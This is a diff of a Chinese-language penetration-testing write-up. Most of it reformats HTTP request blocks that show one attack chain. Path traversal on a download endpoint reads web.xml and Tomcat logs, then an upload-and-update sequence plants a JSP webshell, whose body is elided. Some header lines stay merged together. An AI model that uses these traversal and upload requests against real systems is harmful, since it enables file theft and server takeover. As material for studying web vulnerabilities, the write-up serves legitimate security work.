@@ -18,26 +18,38 @@
 ---
 
 ### 案例1
-- 跟着团队大哥的操作学习
+
+> 跟着团队大哥的操作学习
 
 发现一处文件下载的地方
 
-```http request
-GET /download?module=&method=Download&name=test.zip&filepath=doc/test.zip HTTP/1.1Host: 1.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: text/html,application/xhtml+xml,application/xmlAccept-Encoding: gzip, deflate
+```http
+GET /download?module=&method=Download&name=test.zip&filepath=doc/test.zip HTTP/1.1
+Host: 1.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+Accept: text/html,application/xhtml+xml,application/xml
+Accept-Encoding: gzip, deflate
 ```
 
 burp抓包，换为post请求发现可下载任意文件
 
-```http request
-POST /download HTTP/1.1Host: 1.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: text/html,application/xhtml+xml,application/xmlAccept-Encoding: gzip, deflate
+```http
+POST /download HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+Accept: text/html,application/xhtml+xml,application/xml
+Accept-Encoding: gzip, deflate
 
 module=&method=Download&name=test.zip&filepath=../webapps/WEB-INF/web.xml
 ```
 
 读取日志文件判断class文件的位置
 
-```http request
-POST /download HTTP/1.1Host: 1.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)Accept: text/html,application/xhtml+xml,application/xmlAccept-Encoding: gzip, deflate
+```http
+POST /download HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml,application/xml
+Accept-Encoding: gzip, deflate
 
 module=&method=Download&name=test.zip&filepath=../logs/catalina.2021-xx-xx.log
 ```
@@ -48,16 +60,23 @@ module=&method=Download&name=test.zip&filepath=../logs/catalina.2021-xx-xx.log
 
 首先上传一个空文件到web目录：
 
-```http request
-POST /download HTTP/1.1Host: 1.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: text/html,application/xhtml+xml,application/xmlAccept-Encoding: gzip, deflate
+```http
+POST /download HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+Accept: text/html,application/xhtml+xml,application/xmlAccept-Encoding: gzip, deflate
 
 module=&method=upload&txtFile_Name=x.jsp&home=/&filepath=../webapps/
 ```
 
 再更新文件内容为webshell:
 
-```http request
-POST /download HTTP/1.1Host: 1.1.1.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: text/html,application/xhtml+xml,application/xmlAccept-Encoding: gzip, deflate
+```http
+POST /download HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+Accept: text/html,application/xhtml+xml,application/xml
+Accept-Encoding: gzip, deflate
 
 module=&method=updateContent&home=/&filepath=../webappsdebugx.jsp&content=xxxxxx()
 ```
